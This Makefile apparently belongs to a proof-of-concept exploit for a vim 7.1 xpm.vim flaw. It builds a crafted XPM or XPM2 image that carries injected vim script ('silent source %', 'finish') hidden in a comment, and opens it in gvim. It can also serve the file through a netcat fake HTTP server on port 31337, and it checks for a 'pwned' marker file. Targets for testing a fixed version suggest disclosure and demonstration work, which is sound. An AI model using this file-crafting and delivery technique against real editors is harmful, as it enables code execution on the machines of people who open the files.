# Makefile for rdancer's exploit of the vim 7.1 xpm.vim vulnerability
#
# Usage {{{1
#
# Some interesting targets:
#
#	(1) make sploit
#
#	    Compiles the exploit.
#
#	(2) make demo
#
#	    ``demo'' is the default target.  Compile and run the exploit.
#
#	(3) make test
#	
#	    Compile and run exploit non-interactively.
#
#	(4) make demo-remote, make test-remote
#
#           Remote exploitation.

# Variables {{{1
#
EXPLOIT_DIR = "sploit"
# .xpm2 doesn't work just yet -- we don't have a valid xpm2 file
EXPLOIT_EXTENSIONS = .pm .xpm .xpm2

# Make sure the extension matches the flavour
ifeq (xpm2,${EXPLOIT_FLAVOUR})
 EXPLOIT_EXTENSION ?= .xpm2
else
 EXPLOIT_EXTENSION ?= .xpm
endif
# If both extension and flavour was set by user inconsistently, say so
ifeq (.xpm2,${EXPLOIT_EXTENSION})
 ifneq (xpm2,${EXPLOIT_FLAVOUR})
  $(warning EXPLOIT_EXTENSION ``${EXPLOIT_EXTENSION}'' not consistent with \
  		EXPLOIT_FLAVOUR ``${EXPLOIT_FLAVOUR}'')
 endif
endif
EXPLOIT_NAME ?= $(EXPLOIT_DIR)/exploit$(EXPLOIT_EXTENSION)

# Be very verbose -- use for debugging
#VIM_OPTIONS := -V16
# GUI mode, don't fork into background
VIM_OPTIONS := -gf

# This is the name of the file created by the exploit
PWN_FILE = "pwned"

# Which port is our exploit served from
PORT = 31337
FROM_WHERE ?= local

#
# Targets {{{1
#
# demo -- Run the exploit {{{2
.PHONY: demo
demo: sploit
	rm -f -- $(PWN_FILE)
ifeq (remote,${FROM_WHERE})
	make http-server
endif
	# We use gvim, as vim may be different binary, with no GUI support (as
	# it indeed is on rdancer's system)
ifeq (remote,${FROM_WHERE})
	gvim $(VIM_OPTIONS) -- http://localhost:$(PORT)/$(EXPLOIT_NAME)
else
	gvim $(VIM_OPTIONS) -- $(EXPLOIT_NAME)
endif
	@if test -f $(PWN_FILE); then \
		echo "Exploit worked -- see the \`\`pwned'' file."; \
	else \
		echo "Exploit didn't work."; \
		exit 1; \
	fi

# test-remote -- Test remote exploitation {{{2
.PHONY: test-remote
test-remote: FROM_WHERE := remote
test-remote: test

# demo-remote -- Demo remote exploitation {{{2
.PHONY: demo-remote
demo-remote: FROM_WHERE := remote
demo-remote: demo

# test -- Test whether the exploit works {{{2
.PHONY: test
test: VIM_OPTIONS := ${VIM_OPTIONS} +:q
test: demo

# sploit -- Compile the exploit {{{2
.PHONY: sploit
sploit: exploit.vim
	rm -f -- $(EXPLOIT_NAME)
	mkdir -p -- $(EXPLOIT_DIR)
ifeq (xpm2,${EXPLOIT_FLAVOUR})
	$(warning Can only generate invalid XPM2 files)
	# Note: Payload must not contain ``!'' to work with xpm2.vim 
	echo -n '"/ | delcommand HiLink | delcommand Hi' >> $(EXPLOIT_NAME)
	echo ' | silent source % | finish | "'>> $(EXPLOIT_NAME)
	# Expand all occurrences of PWN_FILE
	sed "s#PWN_FILE#"$(PWN_FILE)"#g"   >> $(EXPLOIT_NAME) < exploit-xpm2.vim
	echo 'CUT_HERE'                    >> $(EXPLOIT_NAME)
	cat vim48x48.xpm2                  >> $(EXPLOIT_NAME)
else
	# Header
	sed -n 1p                          >> $(EXPLOIT_NAME) < vim48x48.xpm
	# Comment out the payload and script
	echo '/*'                          >> $(EXPLOIT_NAME)
	# Note: Payload must not contain ``!'' to work with xpm2.vim 
	echo -n '#! "/ | '                >> $(EXPLOIT_NAME)
	# Expand all occurrences of PWN_FILE
	{ \
		sed "s#PWN_FILE#"$(PWN_FILE)"#g; \
				/^\"/d; \
				/^$$/d;" \
		| tr '\n' '|'; \
		echo '"'; \
	}                                  >> $(EXPLOIT_NAME) < exploit.vim
	echo 'CUT_HERE */'                 >> $(EXPLOIT_NAME)
	sed -n '2,$$p'                     >> $(EXPLOIT_NAME) < vim48x48.xpm
endif

	rm -f exploit
	ln -s -- $(EXPLOIT_NAME) exploit

# all -- Make all exploit flavours and extensions {{{2
all:
	export EXPLOIT_EXTENSION; \
	export EXPLOIT_FLAVOUR; \
	for EXPLOIT_EXTENSION in $(EXPLOIT_EXTENSIONS); do \
		EXPLOIT_FLAVOUR="`echo $$EXPLOIT_EXTENSION | sed s/.//`"; \
		make sploit; \
	done

  
# clean -- Remove most files we can remake {{{2
.PHONY: clean
clean:
ifeq (0,${MAKELEVEL})
	 export EXPLOIT_EXTENSION; \
	 for EXPLOIT_EXTENSION in $(EXPLOIT_EXTENSIONS); do \
		case $$EXPLOIT_EXTENSION in \
		 	.xpm2) EXPLOIT_FLAVOUR=xpm2;; \
		 	*)     EXPLOIT_FLAVOUR=xpm ;; \
		esac; \
		export EXPLOIT_FLAVOUR; \
		make clean; \
	 done
	 rm -f -- $(PWN_FILE)
	 rm -f exploit
else
	 rm -f -- $(EXPLOIT_NAME)
endif

# mrproper -- Remove all files we can remake {{{2
.PHONY: mrproper
# FIXME: Is this OK?
mrproper: clean
  
# test-fixed -- Test the fixed filetype.vim {{{2
.PHONY: test-fixed
test-fixed: VIM_OPTIONS := -u xpm-fixed.vim ${VIM_OPTIONS}
test-fixed: test
	
# demo-fixed -- Demo the fixed filetype.vim {{{2
.PHONY: demo-fixed
demo-fixed: VIM_OPTIONS := -u xpm-fixed.vim ${VIM_OPTIONS}
demo-fixed: demo

#

# http-server -- Serve the exploit via HTTP
.PHONY: http-server
http-server: kill-http-server
	{ \
		printf 'HTTP/1.0 200 OK\r\n\r\n'; \
		sed 's/$$/\r/' < $(EXPLOIT_NAME); \
	} | netcat -lp$(PORT) >/dev/null&
	# Give netcat time to bind to the port
	# Use sleep as it's more portable
	#while :; do netstat -ln | grep '^tcp.*:'$(PORT)'.*LISTEN' && break; done
	while ! fuser -n tcp $(PORT)/tcp; do \
		sleep 1; \
	done >/dev/null 2>&1

# kill-http-server -- Terminate the phony HTTP server
.PHONY: kill-http-server
kill-http-server:
	if fuser -n tcp $(PORT)/tcp >/dev/null 2>&1; then \
		fuser -kn tcp $(PORT)/tcp >/dev/null 2>&1; \
	fi
# dist -- Make a distribution tarball {{{2
.PHONY: dist
dist: mrproper all clean
	make -C .. `pwd | sed 's@.*/@@'`.tar.bz2

#
# Modeline {{{1
#
# vim: foldmethod=marker :
